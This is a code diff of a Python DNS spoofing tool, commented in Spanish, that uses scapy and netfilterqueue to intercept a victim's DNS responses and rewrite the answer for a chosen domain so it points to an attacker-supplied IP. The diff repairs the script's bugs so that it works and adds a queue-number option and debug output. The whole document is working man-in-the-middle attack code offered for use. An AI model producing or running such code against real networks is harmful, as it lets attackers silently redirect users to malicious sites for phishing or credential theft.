@@ -4,24 +4,27 @@ import optparse
 
 def getArguments():
     parser = optparse.OptionParser()
-    parser.add_option('-w', '--domain', dest= 'domain', help= 'Ingresar nombre del sitio web que se quiere redireccionar')
+    parser.add_option('-d', '--domain', dest= 'domain', help= 'Ingresar nombre del sitio web que se quiere redireccionar')
     parser.add_option('-r', '--redirectip', dest= 'redirectIp', help= 'Ip del sitio web de donde se va a hacer la redirección DNS')
+    parser.add_option('-q', '--queue-num', dest= 'queueNum', help= 'Numero del queue (Debe coincidir con el asignado en "iptables")')
     (options, arguments) = parser.parse_args()
     return options
 
 def processPacket(packet):
     scapyPacket = scapy.IP(packet.get_payload()) #Obtiene toda la información del paquete
-
+    
     #Filtra los paquetes DNS Response Record
     if scapyPacket.haslayer(scapy.DNSRR):
-        qname = scapyPacket(scapy.DNSQR).qname #Obtenemos el nombre del sitio web al que ha accedido la víctima
-        options = getArguments()
+        print('Antes:')
+        print(scapyPacket.show())
 
+        qname = scapyPacket[scapy.DNSQR].qname #Obtenemos el nombre del sitio web al que ha accedido la víctima 
+        
         #Realiza el DNS Spoof si la víctima ha accedido a la página deseada
-        if options.domain in qname:
+        if options.domain in str(qname):
             print('[+] Spoofing target')
             #Para spoofear a la víctima debemos modificar el "rrname" y el "rdata" ubicado en "DNS Resource Record"
-            answer = scapy.DNSRR(rname= qname, rrdata= options.redirectIp)
+            answer = scapy.DNSRR(rrname= qname, rdata= options.redirectIp)
             scapyPacket[scapy.DNS].an = answer
             scapyPacket[scapy.DNS].ancount = 1 #Es necesario que los contadores de respuesta(ancount) sean igual a "1"
             
@@ -32,10 +35,22 @@ def processPacket(packet):
             del scapyPacket[scapy.UDP].chksum
 
             #Todas las modificaciones que hemos realizado, las pasamos al paquete original para que el Spoof se realice
-            packet.set_payload(str(scapyPacket))
+            print('Seteando el paquete')
+            packet.set_payload(bytes(scapyPacket))
+            print('\n\n\n\n\n\n---------------------------------------\nDespues:')
+            newPacket = scapy.IP(packet.get_payload())
+            print(newPacket.show())
 
     packet.accept()
 
+options = getArguments()
 queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, processPacket)
-queue.run()
+queue.bind(int(options.queueNum), processPacket)
+
+try:    
+    queue.run()
+
+except KeyboardInterrupt:
+    print('\nPrograma finalizado')
+
+queue.unbind()
